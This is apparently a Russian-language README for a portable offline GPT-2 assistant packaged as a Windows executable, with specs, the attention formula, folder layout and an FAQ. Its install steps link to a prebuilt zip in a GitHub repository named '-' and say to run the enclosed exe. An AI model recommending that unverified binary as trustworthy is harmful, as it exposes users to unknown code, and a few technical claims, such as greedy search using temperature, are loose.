# 🧠 AI Offline Engine: Portable GPT-2 System

**Offline GPT-2 Portable Assistant** - это программный комплекс для автономного запуска больших языковых моделей (LLM) на клиентских машинах без доступа к интернету. Проект решает задачу безопасной обработки данных и независимости от облачных API.

---

## 🛠 Технические характеристики сборки v5.2

В этой версии мы полностью переработали логику инициализации, чтобы исключить ошибки на "чистых" системах:

| Параметр | Значение | Описание |
| --- | --- | --- |
| **Архитектура** | GPT-2 (Distilled) | 6 слоев, 768 скрытых размерностей. |
| **Веса** | 353 MB (Safetensors) | Безопасный формат без возможности исполнения кода. |
| **Backend** | PyTorch 2.2.0+cpu | Оптимизировано для вычислений на центральном процессоре. |
| **Слой абстракции** | Transformers + Accelerate | Автоматическое управление тензорами в RAM. |
| **Сборка** | PyInstaller (OneDir) | Все зависимости (DLL, Libs) упакованы в папку `_internal`. |

## 🧬 Математическая база и логика работы

Система работает на механизме **Self-Attention** (самовнимания), который позволяет модели учитывать контекст всей введенной фразы одновременно. Вероятность следующего токена вычисляется через нормализованное скалярное произведение:

$$\text{Attention}(Q, K, V) = \text{softmax}\left(\frac{QK^T}{\sqrt{d_k}}\right)V$$

### Этапы инференса:

1. **Byte-Pair Encoding (BPE):** Текст разбивается на токены. Словарь содержит 50 257 уникальных единиц.
2. **Positional Encoding:** Каждому токену присваивается координата в пространстве, чтобы модель понимала порядок слов.
3. **Forward Pass:** Данные проходят через блоки трансформера, где вычисляются веса внимания.
4. **Greedy Search / Sampling:** Выбор наиболее вероятного следующего слова на основе параметра `temperature`.

## 📦 Развертывание и структура проекта

Для корректной работы системы структура на носителе должна быть следующей:

```text
📁 GPT2_Offline_v5.2/
├── 📄 GPT2_Offline.exe       # Исполняемый файл
├── 📁 _internal/             # Библиотеки Python (не изменять)
└── 📁 model/                 # <--- СЮДА КЛАДЕМ ВЕСА
    ├── 📄 model.safetensors
    ├── 📄 config.json
    ├── 📄 vocab.json
    ├── 📄 tokenizer.json
    └── 📄 merges.txt

```

### Инструкция по установке:

1. Скачайте дистрибутив: [AI_EXE_Bundle.zip](https://github.com/OopsMerch/-/releases/download/v5.2/AI_EXE_Bundle.zip)
2. Распакуйте архив в корень флеш-карты или жесткого диска.
3. Поместите файлы модели в папку `model/`.
4. Запустите `GPT2_Offline.exe`.

## 🧪 Анализ производительности и Troubleshooting

Проект протестирован на различных конфигурациях. Ожидаемые показатели:

* **Среднее время инициализации:** 8-15 секунд (зависит от скорости чтения с USB).
* **Потребление ОЗУ:** ~1.4 GB в режиме покоя, до 1.8 GB при генерации длинных текстов.
* **Скорость генерации:** ~10 токенов/сек на процессорах уровня Core i5.

### Часто задаваемые вопросы (FAQ):

* **Ошибка "Accelerate not found":** Исправлено в v5.2 через принудительный импорт всех метаданных в сборку.
* **Черный экран при запуске:** Это консоль инициализации. Подождите появления приветственной надписи.
* **Почему английский?** Модель обучалась на корпусе WebText. Для поддержки русского языка требуется замена весов на `RuGPT-3`, что увеличит объем проекта до 3+ GB.
